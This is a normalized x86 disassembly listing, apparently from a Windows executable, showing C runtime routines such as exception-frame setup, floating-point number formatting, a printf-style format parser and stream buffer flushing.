push 0x1
push edi
call sub_409de0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_409de0
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_409de0
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_409eb0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_409dfc
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_405605
pop ecx
pop ecx
push eax
push edi
call sub_409eb0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_405605
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_403e6c
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_405605
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_403e73
jmp r-xdata
push eax
call sub_405605
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40559e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_403e6c
or [ ebp - 0x4 ] 0xffffffff
sub_405605
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_405630
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_404239
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_404239
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40567c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_409c0d
push 0x16
call sub_40c5be
pop ecx
pop ecx
push 0x3
call sub_404bd3
and [ ebp - 0x4 ] 0x0
sub_4056d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40567c
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40573a
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_405778
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_40573a
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_4057a1
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40a3d7
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_4057fb
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_405861
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a861
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_40a834
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_40589f
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40a9f7
mov ebx [ ebp + 0x10 ]
mov esi eax
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebx + 0x1 ]
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
xor ecx ecx
test ebx ebx
setg cl
add edx eax
add ecx edx
push ecx
call sub_40a980
add esp 0x14
mov ebx [ ebp + 0x10 ]
mov eax [ rw-data ]
xor ecx ecx
mov esi eax
test ebx ebx
setg cl
push ecx
xor ecx ecx
cmp [ eax ] 0x2d
sete cl
add ecx [ ebp + 0xc ]
push ecx
call sub_405bb7
pop ecx
pop ecx
jmp r-xdata
test ebx ebx
jle r-xdata
mov [ eax ] 0x2d
inc eax
cmp [ esi ] 0x2d
mov eax [ ebp + 0xc ]
jne r-xdata
xor ecx ecx
push r--data
cmp [ rw-data ] cl
sete cl
add ecx eax
add ecx ebx
push ecx
call sub_40a890
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov cl [ eax + 0x1 ]
push edi
lea edi [ eax + 0x1 ]
mov [ eax ] cl
mov cl [ rw-data ]
mov eax edi
pop edi
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax [ ebp + 0xc ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_4059a3
cmp [ rw-data ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40a9f7
mov ebx [ esp + 0x24 ]
mov esi eax
push esi
mov eax [ esi + 0x4 ]
add eax ebx
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax ebp
push eax
call sub_40a980
add esp 0x14
mov eax [ rw-data ]
mov ebx [ esp + 0x1c ]
mov esi [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebp ] 0x2d
lea edi [ ebp + 0x1 ]
cmp [ esi ] 0x2d
mov edi ebp
jne r-xdata
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebp
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
jmp r-xdata
add edi eax
push 0x1
push edi
call sub_405bb7
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push 0x1
push edi
call sub_405bb7
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
test ebx ebx
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
neg esi
cmp ebx esi
jl r-xdata
neg esi
jmp r-xdata
push ebx
push edi
call sub_405bb7
push ebx
push 0x30
push edi
call sub_4043c0
add esp 0x14
mov ebx esi
sub_405a81
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push ecx
push ecx
fld [ edi ]
fstp [ esp ]
call sub_40a9f7
mov [ rw-data ] eax
mov ecx [ eax + 0x4 ]
dec ecx
mov ebx [ ebp + 0x10 ]
mov [ rw-data ] ecx
xor ecx ecx
cmp [ eax ] 0x2d
push eax
push ebx
sete cl
add ecx [ ebp + 0xc ]
mov esi ecx
push esi
call sub_40a980
mov eax [ rw-data ]
add esp 0x14
mov ecx [ eax + 0x4 ]
dec ecx
cmp [ rw-data ] ecx
setl cl
mov [ rw-data ] cl
mov eax [ eax + 0x4 ]
dec eax
cmp eax 0xfffffffc
mov [ rw-data ] eax
jl r-xdata
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
push edi
call sub_405b1c
add esp 0x10
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
push ebx
push [ ebp + 0xc ]
push edi
call sub_405b43
add esp 0xc
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
and [ esi - 0x2 ] al
sub_405b66
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40589f
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405a81
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4059a3
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_405bb7
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_40ab20
inc eax
push eax
push esi
add esi edi
push esi
call sub_409eb0
add esp 0x10
pop esi
sub_405bdc
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push esi
call sub_406e78
pop ecx
test eax eax
push esi
je r-xdata
push esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_407bd3
add esp 0xc
test eax eax
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_406ea3
pop ecx
pop ecx
jmp r-xdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_407c2a
add esp 0xc
jmp r-xdata
sub_405c45
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_409185
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40ac82
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_409185
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40ac3e
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40aba4
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_405d5a
push ebp
mov ebp esp
sub esp 0x454
mov eax [ ebp + 0xc ]
add [ ebp + 0xc ] 0x2
push ebx
xor ecx ecx
mov bx [ eax ]
push esi
cmp bx cx
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x34 ] ecx
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x8
pop esi
push 0x2
pop edi
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
push 0x20
pop edx
cmp bx dx
jb r-xdata
xor eax eax
cmp bx 0x78
ja r-xdata
mov eax [ ebp + 0xc ]
push 0x2
pop edi
mov bx [ eax ]
add [ ebp + 0xc ] edi
test bx bx
jne r-xdata
jmp [ eax * 4 + jump_table_4064cf ]
movzx eax bx
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x44 ]
push 0x8
pop esi
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x24 ] eax
jmp r-xdata
movzx eax bx
sub eax edx
je r-xdata
cmp bx 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bx 0x2a
jne r-xdata
movzx eax bx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] 0x1
push eax
push [ ebp + 0x8 ]
push ebx
call sub_4064ef
add esp 0xc
jmp r-xdata
movzx eax bx
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x44 ] eax
cmp eax ecx
ja r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x2c ]
movzx ecx bx
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
mov [ ebp - 0x2c ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movzx ecx bx
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x2c ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp [ eax + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x77
jne r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x454 ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
add [ ebp + 0xc ] 0x4
or [ ebp - 0x3 ] 0x80
jmp r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408f22
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] esi
je r-xdata
dec eax
je r-xdata
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
cmp bx 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax esi
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x54 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x50 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x54 ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x38 ] ecx
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] esi
jmp r-xdata
call sub_406579
pop ecx
xor edx edx
call sub_406579
pop ecx
jmp r-xdata
call sub_406579
pop ecx
movzx eax ax
jmp r-xdata
call sub_406579
pop ecx
movsx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x8 ] esi
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bx 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
push 0x1
lea eax [ ebp + 0x10 ]
pop esi
push eax
mov [ ebp - 0x24 ] esi
call sub_406579
test [ ebp - 0x4 ] 0x20
pop ecx
mov [ ebp - 0x48 ] eax
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x28 ] 0x30
add eax 0x51
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x26 ] ax
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
sub eax edi
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x18 ] 0x0
jl r-xdata
push [ ebp - 0x34 ]
call sub_405bdc
and [ ebp - 0x34 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov edi 0x7fffffff
je r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_4044f2
test eax eax
pop ecx
mov [ ebp - 0x34 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_40ab20
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
mov [ ebp - 0x454 ] ax
push [ rw-data ]
and [ ebp - 0x2d ] 0x0
mov [ ebp - 0x2e ] al
lea eax [ ebp - 0x2e ]
push eax
lea eax [ ebp - 0x454 ]
push eax
call sub_40aca8
add esp 0xc
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0x40 ] 0x1
add ebx edx
sub eax edi
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x1c ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test [ ebp - 0x4 ] 0x20
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
lea eax [ ebp - 0x454 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x3c ] esi
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x1c ]
or eax [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x38 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x255 ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
and [ ebp - 0x10 ] 0x0
test edi edi
jle r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x2c ]
sub esi [ ebp - 0x20 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_40ade0
push edi
push esi
push [ ebp - 0x18 ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x1c ]
call sub_40ad70
cmp ebx 0x39
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
jle r-xdata
mov eax [ ebp - 0x1c ]
or eax [ ebp - 0x18 ]
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push [ ebp + 0x8 ]
push [ ebp - 0x20 ]
push eax
call sub_406540
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40650f
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x28 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x38 ]
lea eax [ ebp - 0x255 ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
inc eax
jmp r-xdata
mov edx [ rw-data ]
movzx eax al
test [ edx + eax * 2 + 0x1 ] 0x80
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x28 ] 0x2b
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx edi
dec edi
test edx edx
je r-xdata
inc ecx
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] edi
jl r-xdata
inc ecx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_406540
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40650f
add esp 0x10
mov [ ebp - 0x28 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40650f
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x48 ]
call sub_4064ef
add ebx [ ebp - 0x4c ]
add esp 0xc
mov eax edi
dec edi
test eax eax
jg r-xdata
push [ rw-data ]
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_40aca8
add esp 0xc
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
jmp r-xdata
sub_40650f
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_4064ef
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_406540
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
